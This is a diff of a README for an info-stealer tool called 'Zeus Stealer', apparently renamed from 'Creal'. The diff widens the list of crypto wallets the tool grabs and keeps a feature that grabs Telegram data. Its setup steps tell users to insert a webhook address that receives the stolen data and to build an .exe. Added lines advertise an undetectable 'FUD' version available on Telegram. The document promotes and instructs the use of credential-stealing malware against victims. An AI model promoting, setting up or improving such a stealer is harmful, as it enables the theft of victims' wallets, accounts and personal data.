@@ -15,7 +15,7 @@ if you need help you can write on telegram. Click to write ()
 
 » Shows Crypto Wallets
 
-» Grab metamask/exodus
+» Grab metamask/exodus/trustwallet/phantom/coinbase/rabby
 
 » Grab Telegram
 
@@ -23,9 +23,7 @@ if you need help you can write on telegram. Click to write ()
 
 # SETUP
 
-First paste and save your webhook address instead of "WEBHOOK HERE" in Creal.py
-
-If you use obfuscator it will be undetectable.
+First paste and save your webhook address instead of "WEBHOOK HERE" in Zeus.py
 
 if you have an error while installing try pip install -r requirements.txt
 
@@ -47,3 +45,7 @@ And press covert .py .exe
 ![ZeusStealer1](https://user-images.githubusercontent.com/94788728/216760608-cd8fd833-11aa-4602-94b2-55ba3d8f7ce0.png)
 ![ZeusStealer2](https://user-images.githubusercontent.com/94788728/216760613-10db0161-92c6-4703-a107-8048ed47439c.png)
 ![MessageBox](https://user-images.githubusercontent.com/94788728/216760662-73832629-7e7a-473e-8301-85b83efc85ba.png)
+
+# WANT TO MAKE FUD ?
+
+We can make FUD Stealer. Just contact us on telegram 
